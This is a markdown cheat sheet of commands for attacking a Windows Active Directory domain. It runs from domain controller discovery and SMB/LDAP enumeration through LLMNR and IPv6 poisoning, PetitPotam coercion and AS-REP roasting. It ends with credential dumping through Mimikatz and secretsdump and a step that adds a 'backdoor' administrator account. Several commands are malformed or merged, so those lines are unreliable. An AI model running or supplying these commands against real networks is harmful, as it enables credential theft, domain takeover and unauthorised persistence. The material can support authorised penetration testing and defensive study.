### Find Domain Controller IP
- Commands
	- Shows the domain name and DNS Second command finds the domain controller IP
```
nmcli dev show
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
```
### Zone Transfer
- Command to attempt a DNS zone transfer
```
dig axfr <DOMAIN>@<NAMESERVER>
```

### List Guest Access on SMB Share
- Enum access with guest account
```
enum4linux -a -u "" -g "" <DC_IP>
```
- Enumerate SMB shares
```
smbmap -u "guest" -p "" -H <DC_IP>
```
- List shares accessible as guest
```
smbclient -U "guest" -L //<DC_IP>
```
- Check for null sessions
```
cme smb <DC_IP> -u "" -p "" --shares
```
- Enumerate anonymous access
```
cme smb <IP> -u "" -p ""
```
### Enumerate LDAP
- Search LDAP services
```
nmap -n -sV --script "ldap*" -p 389 <DC_IP>
```
- Retrieve LDAP information
```
ldapsearch -x -h <IP> -b <BASE>
```
### Find User List
- Enumerate users
```
enum4linux -U <DC_IP> | grep 'user'
```
- List users
```
cme smb <IP> --users
```
- Retrieve user information
```
net rpc group members "Domain Users" -W "<DOMAIN>" | <IP> -U%
```
### Poisening
- LLMNR/NetBIOS/MDNS
```
responder -l eth0 #use --lm to force lm downgrade for downgrading and disable SMB & HTTP if relay
```
- IPV6 preferred to IPV4
```
mitm6 -d <domain>
```
- ARP poisening
	- Tools like bettercap
### Coercion
- **PetitPotam (CVE-2022-26925)**: Using PetitPotam to force authentication
```
cme smb --target <LISTENER_IP>
```
```
PetitPotam.py -d <DOMAIN><LISTENER_IP><TARGET_IP>
```
### Initial Recon
- Whoami
```
whoami /priv
```
- List domain Users
```
net user /domain
```
- Get Admin Users
```
Get-NetUser -AdminCount 1
```
### Enumeration & Information Gathering
- Tools
- LDAP Search for AD structure
- PowerView
	- Use Get-NetUser, Get-NetComputer, and Find-DomainShare
- Share Discovery
```
smbclient -L //<TARGET_IP> -N
```
```
netexec smb <TARGET_IP> --shares --users
```
### SMB and Kerberos Attacks
- AS-REP Roasting
```
GetNPUsers.py <DOMAIN>/<USER> -no-pass
```
- Kerbrute User Enumeration
```
kerbrute userenum -d <DOMAIN>
```
- SMB Enumeration
```
smbclient //<IP>/<SHARE> -N
```
### Privilege Escalation Paths
- Bloodhound analyze paths to domain admin after 
```
SharpHound.exe -c All
```
- PowerView checks 
```
Find-ObjectACL -SamAccountName "Domain Admins"
```
### Credential Harvesting
- Mimikatz
```
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```
- Impacket Tools
```
secretsdump.py <DOMAIN>/<USERNAME>@<TARGET> -hashes lm:nt
```
### Persistence Techniques
- Add Admin User
```
net user backdoor Password123! /add net localgroup administrators backdoor /add
```
- Create silver ticket
```
use Rubeus
```